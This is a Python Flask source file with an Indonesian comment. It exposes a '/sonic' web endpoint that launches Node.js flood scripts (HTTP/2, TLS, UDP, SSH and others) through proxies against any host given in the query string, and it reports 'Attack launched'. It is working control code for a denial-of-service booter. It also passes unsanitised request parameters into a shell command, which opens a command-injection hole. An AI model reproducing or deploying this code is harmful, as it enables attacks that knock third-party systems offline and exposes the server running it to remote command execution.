from flask import Flask, request, jsonify
import subprocess

app = Flask(__name__)

@app.route('/sonic')  # methods=['GET'] dihapus, default-nya GET
def sonic():
    host = request.args.get('host')
    port = request.args.get('port')
    time = request.args.get('time')
    methods = request.args.get('methods', '').upper()

    if not all([host, time, methods]):
        return jsonify({"error": "Missing required parameters: host, time, methods"}), 400

    commands = {
        'H2': f'node ./lib/cache/h2.js {host} {time} 45 12 proxy.txt',
        'TLS': f'node ./lib/cache/tls.js {host} {time} 32 8 proxy.txt',
        'FLOOD': f'node ./lib/cache/flood.js {host} {time} 56 12 proxy.txt',
        'MIX': f'node ./lib/cache/mix.js {host} {time} 12 45 proxy.txt -v 3',
        'SKIBIDI': f'node ./lib/cache/skibidi.js {host} {time}',
        'UDP': f'node ./lib/cache/udp.js {host} {port} {time}',
        'SSH': f'node ./lib/cache/ssh.js {host} {port} root {time}'
    }

    command = commands.get(methods)
    if not command:
        return jsonify({"error": f"Unknown method '{methods}'"}), 400

    try:
        subprocess.Popen(command, shell=True)
        return jsonify({"status": "success", "message": f"Attack launched using method {methods}"})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

if __name__ == '__main__':
    app.run(debug=True)
